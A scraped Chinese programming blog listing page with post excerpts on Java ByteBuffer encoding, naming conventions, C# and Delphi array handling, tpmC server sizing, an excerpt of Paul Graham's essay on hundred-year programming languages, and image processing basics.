ByteBuffer俗称缓冲器， 是将数据移进移出通道的唯一方式，并且我们只能创建一个独立的基本类型缓冲器，或者使用“as”方法从 ByteBuffer 中获得。ByteBuffer 中存放的是字节，如果要将它们转换成字符串则需要使用 Charset ， Charset 是字符编码，它提供了把字节流转换成字符串 ( 解码 ) 和将字符串转换成字节流 ( 编码) 的方法。
private byte[] getBytes (char[] chars) {//将字符转为字节(编码)
Charset cs = Charset.forName ("UTF-8");
CharBuffer cb = CharBuffer.allocate (chars.length);
cb.put (chars);
cb.flip ();
ByteBuffer bb = cs.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fa575ced6a9055c9df12e8179c51125a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27e920381234d1002dae87b45b91d0ae/" rel="bookmark">
			变量命名规则
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		"命名规则" Camel 标记法 首字母是小写的，接下来的单词都以大写字母开头。 28 如, var myTestValue = 0, mySecondTest = "hi" Pascal 标记法 首字母是大写的，接下来的单词都以大写字母开头。 如, var MyTestValue = 0, MySecondTest = "hi"
匈牙利类型 标记法 在以Pascal标记法命名的变量前附加一个小写字母(或小写字母序列)，说明该变量的类型。 例如，i表示整数，s表示字符串。 var iMyTestValue = 0, sMySecondTest = "h"
示例 数组 aValues 布尔型 bFound 函数 fnMethod 整型(数字) iValue 浮点型(数字) fValue 对象 oType 正则表达式 rePattern 字符串 sValue 变型(可以任何类型) vValue
特殊法 user_myName [所属归类 + Camel 标记法]
myname [全部小写]
转载于:https://www.cnblogs.com/leamiko/archive/2011/05/29/2062359.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9475e5a31ff8df056271a86c5cd2c9c/" rel="bookmark">
			C#数组之间的比较获取某个数组不包含有另一个数组的值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		业务需求，有时会需要比较两个数组，取一个数组中不包含另一个数组的值。代码如下：
1 string strs = string.Empty; 2 string[] strs1 = { "a", "b", "c", "d" }; 3 string[] strs2 = { "a", "b", "c", "f", "g" }; 4 5 Dictionary&lt;string, string&gt; map = new Dictionary&lt;string, string&gt;(); 6 7 for (int k = 0; k &lt; strs1.Length; k++) 8 { 9 map.Add(strs1[k], ""); 10 } 11 12 for (int m = 0; m &lt; strs2.Length; m++) 13 { 14 //数组一已经存在的值是否包含指定的键值，不包含的才取出来 15 if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9475e5a31ff8df056271a86c5cd2c9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b6dd799d7769ca7dc48dbf559ab289d/" rel="bookmark">
			Delphi OleVariant 类型的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		因客户需求，对客户的指纹机与公司产品进行集成，需要对指纹机做接口的二次开发，郁闷的是产商只提供了VB和C的DEMO示例，没有Delphi的，公司没有VB,C的环境，不能打开这二种语言的示例，因为本公司搭环境特麻烦，加上之前做过类似的开发，所以也懒得去搭环境了，按照以前的开发经验写了个DEMO进行测试，一路进行得很顺利，但到了下载用户指纹和上传用户指纹数据时卡住了，因为下载用户指纹时，用于获取指纹数据传入到接口函数中的参数类型是OleVariant类型的，返回后变成了 Variant array of Integer类型了。这里碰到二个问题了：
1、如何从OleVariant类型的数组中赋值取值
2、指纹数据放在了一个数组中，我如何把这些数据保存到数据库和很方便的从数据库取出来
一直以为OleVariant很复杂，在网上搜了很多资料，终于发现OleVariant类型数组赋值和取值其实很简单，如下：
取值：
procedure p_GetEnrollData(); var dwEnrollData:OleVariant; High,Low,i:Integer; sEnrollList:TStringList; begin sEnrollList:=TStringList.Create; try High:=VarArrayHighBound(dwEnrollData,1); Low:=varArrayLowBound(dwEnrollData,1); for i:=Low to High do begin sEnrollList.Add(inttostr(dwEnrollData[i])) end; //把sEnrollList.Text 保存到数据库中 finally sEnrollList.Free; end; end; 赋值：
procedure p_SetEnrollData(); var dwEnrollData:OleVariant; i:Integer; begin dwEnrollData:=VarArrayCreate([0,1000],varInteger); for i:=0 to 1000 do dwEnrollData[i]:=i; end; 是不是很简单了呢？
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41e338fc01897709d5408012e9d2ab24/" rel="bookmark">
			tpcC值计算方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		计算原则： 以单台服务器性能进行计算，即确保单台服务器工作的时候可以满足系统正常运行的需要；
假设每天有1万人次来窗口办理业务，每人次办理一项业务。即以每日1万笔前台交易为例进行综合系数的推导：
1. 假设每月前台交易数（未来5年内的设计指标）为220,000 （有些业务在月初、月末的处理量比较高，按月统计可以平衡此项差异）;
2. 每日前台交易数=220000/22=10,000 ，即每日 1万笔；
3. 忙时处理能力：每日交易的80%在4个小时内完成，即10000*80%/4=2000（笔/小时）
4. 峰值处理能力：2000*2=4000（笔/小时），即峰值处理能力为每小时4000笔，或 67笔/分，假设业务人员同时在线为100人，即每人每分钟处理0.7笔）
5. 假设每笔交易对应数据库事务数=20，基准TPC指标值对应的比例=8，cpu保留30%的处理能力冗余，计算值与公布值（最优值）的偏差经验值为4 （这几个参数估算的依据不足，更多的是经验值）
则 tpmC值为：
tpmC= 67*20*8*4/(1-30%)= 61257
倒算出 综合系数 = 61257/10000=6.1
即数据库服务器tpmC= 每日前台交易数 * 6.1 （实际计算值应不高于该值）
应用服务器的 tpmC = 数据库服务器 tpmC *50% （一般）
应用服务器的 tpmC = 数据库服务器 tpmC *70% （涉及大量计算的，如社保、税务）
建议：
不管是TPC-C还是SPECjbb2000，计算结果都只能作为一个横向比较的参考。在实际应用中，决定系统性能的因素除了硬件、系统软件外，与应用软件的设计也是有很大关系的，此外，基于系统可扩展性的考虑，更多时候也倾向于一次性的采购。
从长远考虑，以政府信息化主管部门的角度考虑，建立一套评估机制是非常有用的，这其中包括：
1、 通过对各单位业务系统运行情况的调查，进行历史数据的收集分析，按分类建立基准指标库。收集的信息包括：服务器的配置、并发用户数（每天业务量）、CPU负荷等；
2、 由厂商定期提供基准值，更新基准指标库；
有了基准指标库的信息参照，不仅可以用于评估项目建设方案中服务器选型，也可以对各部门进行系统架构设计的优化提供指导。如以下是一些指导原则：
1、 数据库服务器选型：采购两台相同配置的小型机，进行虚拟分区和并行处理，以提高系统资源的利用率；日后扩容时采取垂直扩展的方式进行升级；
2、 应用服务器：采用负载均衡的方式提高并发处理能力，一般可配置2台以上，每台的硬件配置完全可以不同，应首先考虑使用旧的数据库服务器（利旧），如需采购新的服务器，应采用水平扩展的方式逐步升级；
3、 WEB服务器，可以考虑采用刀片服务器，提高扩展性和可管理性。
参考一：
金保工程建设中服务器选型建议：
http://www.molss.gov.cn/gb/zt/2005-12/14/content_98163.htm(中华人民共和国劳动和社会保障部网站)
参考二：某项目计算实例
为了方便计算数据库服务器的造型，我们约定：
" 系统同时在线用户数为1500人（U1）； " 平均每个用户每分钟发出2次业务请求（N1）；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/41e338fc01897709d5408012e9d2ab24/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa2e448e6489ba002bfb725f269e6cf9/" rel="bookmark">
			一百年后，人类怎样编程？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 很难预测一百年后的人类生活，只有少数几件事是可以确定的。那时，汽车将具备低空飞行能力，城市规划的法规将放宽，大楼可以造到几百层，大街上一天到晚看不见太阳，女性个个都学过防身术。本文只想讨论其中的一个细节：一百年后，人们使用什么语言开发软件？ 为什么这个问题值得思考？原因不是我们最终会用上这些语言，而是幸运的话，我们从现在开始就能用上这些语言。 我认为，编程语言就像生物物种一样，存在一个进化的脉络，许许多多分支最终都会成为进化的死胡同。这种现象已经发生了。 Cobol语言曾经流行一时，但是现在看来没有任何后续语言继承它的思想。它就像尼安德特人 一样，进化之路已经走到了尽头。 我预言 Java也会如此。有人写信说：“你怎么能说 Java不会成功呢？它已经成功了。”我觉得这要看你的成功标准是什么。如果标准是相关书籍的出版量，或者是相信学会 Java就能找到工作的大学生数量，那么 Java确实已经成功了。当我说 Java不会成功时，我的意思是它和 Cobol一样，进化之路已经走到了尽头。 这只是我的猜测，未必正确。这里的重点不是看衰 Java，而是提出编程语言存在一个进化的脉络，从而引导读者思考，在整个进化过程中，某一种语言的位置到底在哪里？之所以要问这个问题，不是为了一百年后让后人感叹我们曾经如此英明，而是为了找到进化的主干。它会启发我们去选择那些靠近主干的语言，这样对当前的编程最有利。 无论何时，选择进化的主干可能都是最佳方案。要是你不幸选错了，变成了一个尼安德特人，那就太糟了。你的对手克鲁马努人时不时就会来攻打你，把你的食物全部偷走。 这就是我想找出一百年后的编程语言的原因。我不愿意押错赌注。 编程语言的进化与生物学进化还是有区别的，因为不同分支的语言会发生聚合。比如， Fortran分支看来正在与 Algol 的继承者聚合。理论上，不同的生物物种也可能发生聚合，但是可能性很低，所以大概从来没有真正出现过。 编程语言之所以可能出现聚合，一个原因是它的概率空间 比较小，另一个原因是它的突变不是随机的。语言的设计者们总是有意识地借鉴其他语言的设计思想。 对于语言设计者来说，认清编程语言的进化路径特别有用，因为这样就可以照着样子设计语言了。这时，认清进化的主干就不仅有助于识别现存的优秀语言，还可以把它当作设计语言的指南。 任何一种编程语言都可以分成两大组成部分：基本运算符的集合（扮演公理的角色）以及除运算符以外的其他部分（原则上，这个部分可以用基本运算符表达出来）。 我认为，基本运算符是一种语言能否长期存在的最重要因素。其他因素都不是决定性的。这有点像买房子的时候你应该先考虑地理位置。别的地方将来出问题都有办法弥补，但是地理位置是没法变的。 慎重选择公理还不够，还必须控制它的规模。数学家总是觉得公理越少越好，我觉得他们说到了点子上。 你仔细审视一种语言的内核，考虑哪些部分可以被摒弃，这至少也是一种很有用的训练。在长期的职业生涯中，我发现冗余的代码会导致更多冗余的代码，不仅软件如此，而且像我这样性格懒散的人，我发现在床底下和房间的角落里这个命题也成立，一件垃圾会产生更多的垃圾。 我的判断是，那些内核最小、最干净的编程语言才会存在于进化的主干上。一种语言的内核设计得越小、越干净，它的生命力就越顽强。 当然，猜测一百年后人们使用什么编程语言，这本身就是一个很大的假设。也许一百年后人类已经不编程了，或者直接告诉计算机想做什么，计算机就会自动完成。 不过，到目前为止，计算机智能并没有取得太大进展。我猜测一百年后，人们还是使用与现在差不多的程序指挥计算机。可能有一些我们今天需要编程解决的问题，那时已经不需要编程了，但是我想，那时还会存在大量与今天一样的编程任务。 你可能认为只有那些自以为是的人才会去预言一百年后的技术。但是，请不要忘记，软件发展的历史已经走过了 50年。在这 50年中，编程语言的进化其实是非常缓慢的，因此展望一百年后的语言并不是虚无缥缈的想法。 编程语言进化缓慢的原因在于它们并不是真正的技术。语言只是一种书写法，而程序则是一种严格符合规则的描述，以书面形式记录计算机应该如何解决你的问 题。所以，编程语言的进化速度更像数学符号的进化速度，而不像真正的技术（比如交通或通信技术）的进化速度。数学符号的进化是缓慢的渐变式变化，而不是真 正技术的那种跳跃式发展。 无论一百年后的计算机是什么样子，我们基本上可以断定它们的运行速度一定会快得多。如果摩尔定律依然成立，一百年后计算机的运行速度将是现在的 74乘以 10的 18次方倍（准确地说是 73 786 976 294 838 206 464倍）。真是让人难以想象。不过实际上更现实的预测并不是速度会提高这么多，而是摩尔定律最终将不成立。不管是什么东西，如果每 18个月就增长一倍，那么最后很可能会达到极限。但那时的计算机比现在快得多大概是毫无疑问的。即使最后只是略微快了 100万倍，也将实质性地改变编程的基本规则。如果其他条件不变，现在被认为运行速度慢的语言（即运行的效率不高）将来会有更大的发展空间。 那时，依然会有对运行速度要求很高的应用程序。我们希望计算机解决的有些问题其实是计算机本身引起的。比如，计算机处理视频的速度取决于生成这些视频的另一台计算机。此外，还有一些问题本身就要求无限快的处理能力，比如图像渲染、加密 /解密、模拟运算等。 既然在现实中一些应用程序本身的效率较低，而另一些应用程序会耗尽硬件提供的所有运算能力，那么有了更快速的计算机就意味着编程语言不得不应付更多的极 端情况，涵盖更大范围的效率要求。我们已经看到这种情况发生了。要是以几十年前的标准衡量，有一些使用新语言开发的热门应用程序对硬件资源的浪费非常惊 人。 不仅编程语言有这种现象，这实际上是一种普遍的历史趋势。随着技术的发展，每一代人都在做上一代人觉得很浪费的事情。 30年前的人要是看到我们今天如此随意地使用长途电话，一定会感到震惊。 100年前的人要是看到一个普通的包裹竟然也能享受一天内从波士顿发件、途经孟菲斯、抵达纽约的待遇，恐怕就要更震惊了。 我已经预测了，一旦未来硬件的性能大幅提高将会发生什么事。新增加的运算能力都会被糟蹋掉。 在我学习编程的年代，计算机还是稀罕玩意。我记得当时使用的微机型号是 TRS-80，它的内存只有 4K，为了把 BASIC程 序装入内存，我不得不把源码中的空格全部删除。我一想到那些极其低效率的软件，不断重复某些愚蠢的运算，把硬件的计算能力全部占用，就感到无法忍受。但 是，我的这种反应是错的，我就像某个出身贫寒的穷孩子，一听到要花钱就舍不得，即使把钱用在重要场合（比如去医院看病）都觉得很难接受。 某些浪费确实令人厌恶。比如有人就很讨厌 SUV（运动型多用途车），即使它采用可再生的清洁能源也改变不了看法，因为 SUV来自一个令人厌恶的想法（如何使得小货车看上去更有男子汉气概）。但是，并非所有的浪费都是坏的。既然如今的电信基础设施已经如此发达，再掐着时间打长途电话就有点锱铢必较了。如果有足够的资源，你可以将长途电话和本地电话视为同一件事，一切会变得更轻松。 浪费可以分成好的浪费和坏的浪费。我感兴趣的是好的浪费，即用更多的钱得到更简单的设计。所以，问题就变成了如何才能充分利用新硬件更强大的性能最有利地“浪费”它们？ 对速度的追求是人类内心深处根深蒂固的欲望。当你看着计算机这个小玩意，就会不由自主地希望程序运行得越快越好，真的要下一番功夫才能把这种欲望克制住。设计编程语言的时候，我们应该有意识地问自己，什么时候可以放弃一些性能，换来一点点便利性的提高。 很多数据结构存在的原因都与计算机的速度有关。比如，今天的许多语言都同时有字符串和列表。从语义上看，字符串或多或少可以理解成列表的一个子集，其中 的每一个元素都是字符。那么，为什么还需要把字符串单列为一种数据类型呢？完全可以不这么做。只是为了提高效率，所以字符串才会存在。但是，这种以加快运 行速度为目的、却使得编程语言的语义大大复杂的行为，很不可取。编程语言设置字符串似乎就是一个过早优化的例子。 如果我们把一种语言的内核设想为一些基本公理的集合，那么仅仅为了提高效率就往内核添加多余的公理，却没有带来表达能力的提升，这肯定是一件很糟的事。没错，效率是很重要，但是我认为修改语言设计并不是提高效率的正确方法。 正确做法应该是将语言的语义与语言的实现予以分离。在语义上不需要同时存在列表和字符串，单单列表就够了。而在实现上做好编译器优化，使它在必要时把字符串作为连续字节的形式处理。 对于大多数程序，速度不是最关键的因素，所以你通常不需要费心考虑这种硬件层面上的微观管理。随着计算机速度越来越快，这一点已经越发明显了。 语言设计时，对实现方式少作限制还会使得程序具备更大的灵活性。语言的规格发生变化不仅是无法避免的，也是合理的。通过编译器的处理，按照以前规格开发的软件就会照常运行，这就提供了灵活性。 essay（论文）这个词来自法语的动词 essayer，意思是“试试看”。从这个原始意义来说，论文就是你写一篇文章，试着搞清楚某件事。软件也是如此。我觉得一些最好的软件就像论文一样，也就是说，当作者真正开始动手写这些软件的时候，他们其实不知道最后会写出什么结果。 Lisp语 言的黑客早就明白数据结构灵活性的价值。我们写程序的第一版时，往往会把所有事情都用列表的形式处理。所以，这些最初版本可能效率低下得惊人，你必须努力 克制自己才能忍住不动手优化它们，这就好像吃牛排的时候必须努力克制自己才能不去想牛排是从哪里来的一样，至少对我来说是这样的。 一百年后的程序员最需要的编程语言就是可以让你毫不费力地写出程序第一版的编程语言，哪怕它的效率低下得惊人（至少按我们今天的眼光来看是如此）。他们会说，他们想要的就是很容易上手的编程语言。 效率低下的软件并不等于很烂的软件。一种让程序员做无用功的语言才真正称得上很烂。浪费程序员的时间而不是浪费机器的时间才是真正的无效率。随着计算机速度越来越快，这会变得越来越明显。 我觉得，放弃字符串类型已经是大家可以接受的想法了。 Arc语言已经这样做了，看上去效果不错。以前用正则表达式很难描述的一些操作，现在用回归函数可以表达得很简单。 这种数据结构的扁平化趋势会怎么发展？我极其努力地设想各种可能，得到的结果甚至令我自己都吓了一跳。比如，数组会不会消失？毕竟数组只是散列表的一个子集，其特点就是数组的键全部都是整数向量。进一步说，散列表本身会不会被列表取代呢？ 还有比这更惊人的预言。在逻辑上其实不需要对整数设置单独的表示法，因为可以把它们也看作列表，整数 n可以用一个 n元素的列表表示。这一样能完成数学运算，只是效率低得让人无法忍受。 编程语言会发展到放弃基本数据类型之一的整数这一步吗？我这样问并不是真的要你严肃思考这个问题，更多的是希望打开你对未来的思路。我只是提出一种假想 的情况：如果一股不可抗拒的力量遇到了一个不可移动的物体，会发生什么事。具体就本文而言：一种效率低得不可想象的语言遇到了性能强大得不可想象的硬件， 会发生什么事。我看不出放弃整数类型有什么不妥。未来相当漫长。如果我们想要减少语言内核中基本公理的数目，不妨把眼光放得远一点，想一想如果时间变量 t趋向无限会怎么样。一百年是一个很好的参考指标，如果你觉得某个想法在一百年后仍然可能是难以令人接受，那么也许一千年后它也依然难以令人接受。 让我说清楚，我的意思不是说所有的整数运算都用列表来实现，而是说语言的内核（不涉及任何编译器的实现）可以这样定义。在现实中，任何进行数学运算的程序可能都是以二进制形式表示数字，但是这属于编译器的优化，而不属于语言内核语义的一部分。 另一种消耗硬件性能的方法就是，在应用软件与硬件之间设置很多的软件层。这也是我们已经看到的一种趋势，许多新兴的语言就被编译成字节码 。比尔•伍兹曾经对我说，根据经验判断，每增加一个解释层，软件的运行速度就会慢一个数量级。但是，多余的软件层可以让编程灵活起来。 Arc语言 最初的版本就是一个极端的例子，它的层很多，运行速度非常慢，但是确实带来了相应的好处。 Arc是一个典型的“元循环”（ metacircular）解释器，在 Common Lisp的基础上开发，很像约翰•麦卡锡在他经典的 Lisp论文中定义的 eval函数。 Arc解释器一共只有几百行代码，所以很便于理解和修改。我们采用的 Common Lisp版本是 CLisp，它本身是在另一个字节码解释器的基础上开发的。所以，我们一共有两层解释器，最上面那层效率低下得惊人，但是语言本身是能用的。我承认只是勉强可用，但是确实能用。 即使是应用程序，使用多层形式开发也是一种很强大的技巧。自下而上的编程方法意味着要把软件分成好几层，每一层都可以充当它上面那一层的开发语言。这种方法往往会产生更小、更灵活的程序。它也是通往软件圣杯——可重用性（ reusability）——的最佳路线。从定义上看，语言就是可以重用的。在编程语言的帮助下，你的应用程序越是采用这种多层形式开发，它的可重用性就越好。 可重用性这个概念多多少少与 20世纪 80年 代兴起的面向对象编程有些关联。不管怎样寻找证据，也不可能把这两件事完全分开。某些使用面向对象编程开发出来的软件确实具有可重用性，但是这不是因为它 使用了面向对象编程，而是因为它的开发方法是自下而上的。以函数库为例，它们具有可重用性，是因为它们属于语言的一部分，而不是因为它们采用面向对象或者 其他编程方法。 顺便说一句，我不认为面向对象编程将 来会消亡。我觉得，除了某些特定的领域，这种编程方法其实没有为优秀程序员带来很多好处，但是它对大公司有不可抗拒的吸引力。面向对象编程使得你有办法对 一团乱码似的代码进行可持续性开发。通过不断地打补丁，它让你将软件一步步做大。大公司总是倾向于采用这样的方式开发软件。我预计一百年后也是如此。 既然是谈论未来，最好谈谈并行计算（ parallel computation），因为看上去并行计算好像就是为未来而存在的。无论怎么想，并行计算似乎都是未来生活的一部分。 它会在未来实现吗？过去二十年，人们都在说并行计算马上就会来临。但是，到目前为止，它对编程实践并没有太大影响。这是真的吗？芯片设计师已经不得不把它考虑在内，为多 CPU计算机开发系统软件的程序员也是如此。 但是，真正的问题在于，并行计算到底能达到哪个抽象层次？一百年后它就会影响到开发应用软件的程序员吗？或者，它还只是编译器作者需要考虑的事情，在应用软件的代码中根本就无处寻觅？ 一种可能是，大多数可以用到并行计算的场合，人们都会放弃使用并行计算。虽然我总的预测是未来的软件会挥霍掉大部分新增的硬件性能，但是并行计算是一个 特例。我估计随着硬件性能得到惊人的提升，如果你明确地说想要并行计算，那么肯定可以得到它，但是通常情况下你不会用到它。这意味着，除了一些特殊的应用 程序，一百年后的并行计算不会是那种大规模的并行计算（ massive parallelism）。我预料，对于普通程序员来说，一切更像对进程进行分叉，然后让多个进程在后台并行运行。 这是编程进行到很后期才要做的事情，属于对程序的优化，类似于你想开发一种特定的数据结构来取代现有的数据结构。程序的第一个版本通常会忽略并行计算提供的各种好处，就好像编程开始时会忽略某种特定的数据结构给你带来的好处一样。 除了某些特定的应用软件，一百年后，并行计算不会很流行。如果应用软件真的大量使用并行计算，这就属于过早优化了。 一百年后会有多少种编程语言？从最近来看，出现了大量的新语言。硬件性能提高是一个原因，这就允许程序员根据使用目的在运行速度和编程便利性之间做出不同的取舍。如果这就是未来的趋势，那么一百年后强大的硬件只会使得语言数目变得更多。 但是，另一方面，一百年后的常用语言可能只有很少几种。部分原因是基于我的乐观主义，我相信在未来，如果你的作品确实很出色，你可能选择的是一种开发起 来很方便的语言。使用这种语言写出来的软件第一版的运行速度很慢，只有对编译器进行优化设置后运行速度才会提升。既然我抱有这种乐观主义，那么我还要做一 个预言。有些语言可以达到机器的最高效率，另一些语言的效率则慢到刚刚可以运行而已，两者之间存在巨大的差距。我预言一百年后，这段差距之间的各个点上都 会有对应的编程语言存在。 因为这段差距正在变得越来越大，所以性能分析器（ profiler） 将变得越来越重要。目前，性能分析并没有受到重视。许多人好像仍然相信，程序运行速度提升的关键在于开发出能够生成更快速代码的编译器。代码效率与机器性 能的差距正在不断加大，我们将会越来越清楚地看到，应用软件运行速度提升的关键在于有一个好的性能分析器帮助指导程序开发。 我说将来可能只有很少几种常用语言，但没有把用于特定领域的“小众语言”（ little language）算进去。我觉得，这些嵌入式语言的想法很不错，一定会蓬勃发展。但是我判断这些“小众语言”会被设计成相当薄的一层，使得用户可以一眼看出在底下作为基础的通用型语言，这样就减少了学习时间，降低了使用成本。 谁来设计这些未来的语言？过去 10年最激动人心的趋势之一就是开源语言的崛起，比如 Perl、 Python和 Ruby。语言设计已经被黑客接管。到目前为止这样到底是好是坏还看不清楚，但是发展势头令人鼓舞。比如， Perl就有一些绝妙的创新。不过，它也包含了一些很糟糕的想法。对于一种充满进取心、大胆探索的语言来说，这也是很正常的事。以它现在这种变化的速率，大概只有上帝才知道一百年后 Perl会变成什么样。 有一句俗话说，如果你自己做不到，那就去当老师。这在语言设计领域不成立，我认识的一些最出色的黑客就在当教授。但是，当老师的人确实有很多事情不能 做。研究性职位给黑客带来了一些限制。在任何学术领域，都有一些题目是可以做的，另一些题目是不可以做的。不幸的是，这两类题目的区别通常取决于它们写成 论文后看上去是不是很高深，而不是取决于它们对软件业的发展是否重要。最极端的例子可能就是文学，文学研究者的任何成果几乎对文学创作者都毫无影响。 虽然科学领域的状况要稍好一点，但是研究者可以做的题目与能够对设计优秀语言有所帮助的题目之间的交集小得令人沮丧。（奥林• 希弗斯曾经对这一点表达不满，而且说得头头是道。）比如，研究变量类型的论文好像多得无穷无尽，尽管事实上静态类型语言看来无法真正支持宏（在我看来，一种语言不支持宏，那就不值得使用了）。 新语言更多地以开源项目的形式出现，而不是以研究性项目的形式出现。这是语言的一种发展趋势。另一种发展趋势是，新语言的设计者更多的是本身就需要使用它们的应用软件作者，而不是编译器作者。这似乎是好的趋势，我期待它继续保持下去。 一百年后的物理学基本上不可能预测。但是计算机语言不一样，现在就动手设计一种一百年后可以吸引使用者的新语言，这在理论上似乎是可能的。 设计新语言的方法之一就是直接写下你想写的程序，不管编译器是否存在，也不管有没有支持它的硬件。这就是假设存在无限的资源供你支配。不管是今天还是一百年后，这样的假设好像都是有道理的。 你应该写什么程序？随便什么，只要能让你最省力地写出来就行。但是要注意，这必须是在你的思维没有被当前使用的编程语言影响的情况下。这种影响无处不 在，必须很努力才能克服。你也许觉得，对于人类这样懒惰的生物，喜欢用最省力的方式写程序是再自然不过的事情。但是事实上，我们的思想可能往往会受限于某 种现存的语言，只采用在这种语言看来更简单的形式，它对我们思想的束缚作用会大得令人震惊。新语言必须靠你自己去发现，不能依靠那些让你自然而然就沉下去 的思维定势。 采用程序的长度作为它耗费工作量的近似指标是个很有用的技巧。这里的程序长度当然不是指字符的数量，而是指各种句法元素的总长度，基本上就是整个解析树 的大小。也许不能说最短的程序就是写起来最省力的程序，但是当你一心想把程序写得简洁而不是松松垮垮时，你就更接近省力这个目标，你的日子也会变得好过得 多。所以，设计语言的正确做法就变成了，看着一段程序，然后问自己是不是能把它写得更短一点？ 实际上，用想象出来的一种一百年后的语言来写程序，这件事情的可靠程度，取决于你对语言内核的估计是否足够正确。常规的排序，你现在就可以写出来。但是，想要预测一百年后的语言使用什么函数库就很难了。很可能许多函数库针对的领域现在还根本不存在。比如，如果 SETI@home 计划成功，我们就需要与外星人联系的函数库了。当然，如果外星人的文明高度发达，已经到了用 XML格式交换信息的地步，那就不需要新的函数库了。 另一个极端是，我觉得今天你就能设计出一百年后的语言内核。事实上，在有些人看来，大部分语言内核在 1958年就已经设计出来了。 如果今天就能使用一百年后的编程语言，我们会用它编程吗？观古而知今。如果 1960年就能使用今天的编程语言，那时的人们会用它们吗？ 在某些方面，回答是否定的。今天的编程语言依赖的硬件在 1960年并不存在。比如， Python这样的语言，正确的缩进（ indentation）在编写时很重要，但是 1960年的计算机没有显示器，只有打印机终端，所以编写起来就不会很顺利。但是，如果把这些因素排除在外（你可以假设，我们只在纸上编程）， 20世纪 60年代的程序员会喜欢用现在的语言编程吗？ 我想他们会的。某些缺乏想象力、深受早期编程语言思想影响的人可能会觉得不可能。（没有指针运算，如何复制数据？没有 goto语句，如何实现流程图？）但是我想，那时最聪明的程序员一定能轻松地使用今天的大多数语言，假定他们能得到的话。 如果我们现在就能拥有一百年后的编程语言，那就至少能用来写出优秀的伪码 。我们会用它开发软件吗？因为一百年后的编程语言需要为某些应用程序生成快速代码，所以很可能它生成的代码能够在我们的硬件上运行，速度也还可以接受。相比一百年后的用户，我们也许不得不对这种语言做更多的优化，但是总的来看，它应该仍然会为我们带来净收益。 现在，我们的两个观点就是：（ 1）一百年后的编程语言在理论上今天就能设计出来；（ 2）如果今天真能设计出这样一种语言，很可能现在就适合编程，并且能够产生更好的结果。如果我们把这两个观点联系起来，那就得出了一些有趣的可能性。为什么不现在就动手尝试写出一百年后的编程语言呢？ 当你设计语言的时候，心里牢牢记住这个目标是有好处的。学习开车的时候，一个需要记住的原则就是要把车开直，不是通过将车身对齐画在地上的分隔线，而是通过瞄准远处的某个点。即使你的目标只在几米开外，这样做也是正确的。我认为，设计编程语言时，我们也应该这样做。 摘自《 黑客与画家 》 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68c8bec002ccdff160d92edaf5a4e137/" rel="bookmark">
			DataGridView 保存编辑的行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以前一直用选择其它行的方式结束编辑当前的行，进而实现保存。
this.dataGridView.currentCell=null;;//该行的作用是取消datagridview行的编辑状态今天突然发现了只要执行这句就好了，无语了，省略N个字。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1fe05b610d8ee63a9b474b1526e9bd4d/" rel="bookmark">
			图像处理与识别学习小结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图像处理与识别学习小结 收藏 图像处理与识别学习小结
数字图像处理是对图像进行分析、加工、和处理，使其满足视觉、心理以及其他要求的技术。图像处理是信号处理在图像域上的一个应用。目前大多数的图像是以数字形式存储，因而图像处理很多情况下指数字图像处理。此外，基于光学理论的处理方法依然占有重要的地位。 数字图像处理是信号处理的子类， 另外与计算机科学、人工智能等领域也有密切的关系。 传统的一维信号处理的方法和概念很多仍然可以直接应用在图像处理上，比如降噪、量化等。然而，图像属于二维信号，和一维信号相比，它有自己特殊的一面，处理的方式和角度也有所不同。大多数用于一维信号处理的概念都有其在二维图像信号领域的延伸，它们中的一部分在二维情形下变得十分复杂。同时图像处理也具有自身一些新的概念，例如，连通性、旋转不变性，等等。这些概念仅对二维或更高维的情况下才有非平凡的意义。图像处理中常用到快速傅立叶变换，因为它可以减小数据处理量和处理时间。 数字图像处理应用在以下方面 ：
摄影及印刷 (Photography and printing)
卫星图像处理 (Satellite image processing)
医学图像处理 (Medical image processing)
面孔识别, 特征识别 (Face detection, feature detection, face identification)
显微图像处理 (Microscope image processing)
汽车障碍识别 (Car barrier detection)
数字图像基础
图像的基本概念、图像取样和量化、数字图像表示、 空间和灰度级分辨率、图像纹理、像素间的一些基本关系（相邻像素、邻接性、连通性、区域和边界、距离度量）、线性和非线性变换。
线性变换：如果变换函数是线性的或是分段线性，这种变换就是线性变换。以线性函数加大图像的对比度的效果是使整幅图像的质量改善。以分段线性函数加大图像中某个（或某几个）亮度区间的对比度的效果是使局部亮度区间的质量得到改善。
非线性变换：当变换函数是非线性时，即为非线性变换。常用的有指数变换和对数变换。
RGB (red green blue): 红绿蓝三基色
CMYK (Cyan-Magenta-Yellow-black inK): 青色-品红-黄色-黑色
HSI (Hue-Saturation-Intensity): 色调-饱和度-强度
DDB (device-dependent bitmap): 设备相关位图
DIB (device-independent bitmap): 设备无关位图
CVBS (Composite Video Broadcast Signal): 复合电视广播信号
YUV（亦称Y Cr Cb）是被欧洲电视系统所采用的一种颜色编码方法（属于PAL制）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1fe05b610d8ee63a9b474b1526e9bd4d/">Read more…</a>
	</div>
